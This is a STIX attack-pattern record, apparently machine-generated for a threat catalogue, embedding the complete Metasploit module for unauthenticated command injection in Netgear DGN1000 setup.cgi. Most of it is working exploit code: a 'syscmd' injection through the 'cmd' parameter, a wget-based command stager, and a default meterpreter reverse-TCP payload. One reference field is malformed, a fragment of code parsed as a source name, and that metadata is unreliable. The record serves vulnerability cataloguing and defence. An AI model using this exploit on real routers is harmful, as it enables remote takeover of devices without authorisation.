{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6a9fa097-4e99-46c0-86cb-3537935dea43",
    "created": "2024-08-14T17:03:01.706339Z",
    "modified": "2024-08-14T17:03:01.706343Z",
    "name": "Netgear DGN1000 Setup.cgi Unauthenticated RCE",
    "description": " This module exploits an unauthenticated OS command execution vulneralbility in the setup.cgi file in Netgear DGN1000 firmware versions up to 1.1.00.48, and DGN2000v1 models. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/netgear_dgn1000_setup_unauth_exec.rb",
            "external_id": "netgear_dgn1000_setup_unauth_exec.rb"
        },
        {
            "source_name": "fail_with(Failure::Unknown",
            "external_id": "\"#{peer}-FailedtoaccessvulnerableURL\")"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'Netgear DGN1000 Setup.cgi Unauthenticated RCE',\n      'Description' => %q{\n        This module exploits an unauthenticated OS command execution vulneralbility\n        in the setup.cgi file in Netgear DGN1000 firmware versions up to 1.1.00.48, and\n        DGN2000v1 models.\n        },\n      'Author' => [\n        'Mumbai', # https://github.com/realoriginal (module)\n        'Robort Palerie <roberto@greyhats.it>' # vuln discovery\n      ],\n      'References' => [\n          ['EDB', '25978'],\n      ],\n      'DisclosureDate' => '2013-06-05',\n      'License' => MSF_LICENSE,\n      'Platform' => 'linux',\n      'Arch' => ARCH_MIPSBE,\n      'DefaultTarget' => 0,\n      'DefaultOptions' => {\n        'PAYLOAD' => 'linux/mipsbe/meterpreter/reverse_tcp'\n      },\n      'Privileged' => true,\n      'Payload' => {\n        'DisableNops' => true,\n      },\n      'Targets' => [[ 'Automatic', {} ]],\n    ))\n  end\n\n  def check\n    begin\n      res = send_request_cgi({\n        'uri' => '/setup.cgi',\n        'method' => 'GET'\n        })\n      if res && res.headers['WWW-Authenticate']\n        auth = res.headers['WWW-Authenticate']\n        if auth =~ /DGN1000/\n          return Exploit::CheckCode::Detected\n        end\n      end\n    rescue ::Rex::ConnectionError\n      return Exploit::CheckCode::Unknown\n    end\n    Exploit::CheckCode::Unknown\n  end\n\n  def exploit\n    print_status(\"#{peer} - Connecting to target...\")\n\n    unless check == Exploit::CheckCode::Detected\n      fail_with(Failure::Unknown, \"#{peer} - Failed to access vulnerable URL\")\n    end\n\n    print_status(\"#{peer} - Exploiting target ....\")\n    execute_cmdstager(\n      :flavor => :wget,\n      :linemax => 200,\n      :concat_operator => \" && \"\n    )\n  end\n\n  def execute_command(cmd, opts)\n    begin\n      res = send_request_cgi({\n        'uri' => '/setup.cgi',\n        'method' => 'GET',\n        'vars_get' => {\n          'next_file' => 'netgear.cfg',\n          'todo' => 'syscmd',\n          'cmd' => cmd.to_s,\n          'curpath' => '/',\n          'currentsetting.htm' => '1'\n        }\n      })\n      return res\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{peer} - Failed to connect to the web server\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-06-05",
    "x_mitre_platforms": [
        "linux'"
    ]
}